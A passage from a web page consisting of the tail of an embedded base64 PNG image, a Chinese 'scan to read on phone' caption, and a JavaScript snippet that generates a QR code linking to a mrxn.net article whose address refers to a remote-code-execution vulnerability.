XxAaYk5X2oZ+Gkkk/pJNwBOf7/YAj8vYHI/6QaZmVLIdQomD9w/ZX282Z/7X1nvupB8dFKeD/hIycVkUvLG9KRaT09KPZmU/AqTTXUuM632nuWZm1rlnS+aS09KLnZOPdmUXDQfvD8hPpU3weWPvX2+bPasOtc8W0+1vuLJprxXrlOd1z9Ds+lLyc1GS6nnOiVvtE/UT09Krt+on2xKX32P9ydk/zTe4Prhx97VmbLZfZlTW3F134rOt97c/kbn7LEzzmr9Wb7qVxev5nlG83L71IP3J8Sn8ia4fQ9xa9lSSi5G29dK9+vSb+4MdfFKd554ltdz5hU6Q+z+K+78VU7d+eYbzQXvT0g/nRfz7XuIW8yWUvI+X7yUfq73pW5fc3V7VnylO89++R71RD1nyvVFfbFzze1rXe4cc2L78uD9CfGpvQlefg/pc2aLqdaf5+fJzEz5FpmKti99NXNBvVzvS13ce/vrnvm7+f2s/XXP3Xt9fX9C+om8mG8L6S3KRc/pWyOufPXOrbi692nUd66+erA9M60nm2q981e+eXGVz71S+rlONY+2LcShN772CWw/ZWU7+1ody62KnVN3lr68fbm55vbpNzcfNCNGS6146z27fXmjfY25d6rzX/H7E/LV03mBt/2U9ey9+y2wL29C6orbn2zqiieTWs1VDzor1yl5Y7x96ec+KbmZK24uvSn5s5ge6/6EPPvUvim3fQ9xQ33ffjvMie03v8qtfM/hvM6p79Ee0Z4Vdk7eaH/rzT2L+ear/F6/PyH7p/EG19tC3KZnWnF1sd+GVb85/UZ90fnm5PqN4WZX6IzGq7y+fXIx907JVzn9RvPBbSEduvlrnsByIdn4vjyemrzxWX+Vy1uSar953ze8M5mzr2RSnYu2L31x751de48zL9rKd/4elwvJoLu+/wlsv4e4pT6C29WXd675Vd45jc5Rl6/Q3B699wrN6su9x4qbN9fYfnPz6n2f+PcnJE/hjWr7PaTPdLa9ZNyu2Lnm5tK7r9bljfueXPf8aJa98hWa+2pWevXNR0s1j5Za5ePty9xe8/r+hPgk3gQfFuL2Rc/pVhs717z75St8dr457xdUa1zdSz29qRVXv8LMSHl/89FSzaOl1IMPC4l41+uewPZTVh+ht6yfjabknZM3pielbn9jMvta5c3s+9VEPWeI6iv8lTtPtN/3a34+5Vy9PyHnz+Vl6vZTllsXVydq37dB7L7Wm3de7n3My9tX36MZe6+4vZ3r/vblonMa9cWv/PsT4lN6E9y+h/g2PIur89uv79uw4q0/m7fP+wXVRGfFS8n1xXgpuWheVBdXemalzDXGS7Uefn9C8hTeqLaFuO0rXJ3dPv28AfvSV+tc86uceecG1URnxEupN8ZLtf6nPLNSq/54qTN/W8iZeWvf/wQeFuJb1bg6WjadMp/rlPlcp5pH29fKX81VP8OeJRf39821M9qX6ye7L/XOqYv69spF9eDDQgzd+Jon8NcX0m/Firful9963pqUfq5T8j1GT6n1rNb107OvzumZ1xf1m7duv7kz/OsLObvJrT3/BP73Qnrr/VZ4lGdzq/xK937Bq3v8X98zNDo3Z0jJOydvXx783wvxJjf+nSfwsJBs+KxWt+tstpxq3X51eaO+uPLVcy+re9TNrvzOmRfbb95zmztHXTzTHxZi6MbXPIFtIW79ClfHtK+3r77qU382Z/4Me4ZnURfVRWc1Vxf1RXXniuqi+ZWvHtwWYvONr30C90Je+/wf7v4fAAAA//8ihKBDAAAABklEQVQDAKiGtqHIS6f2AAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-CommMng-Print-UploadMailFile-RCE.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 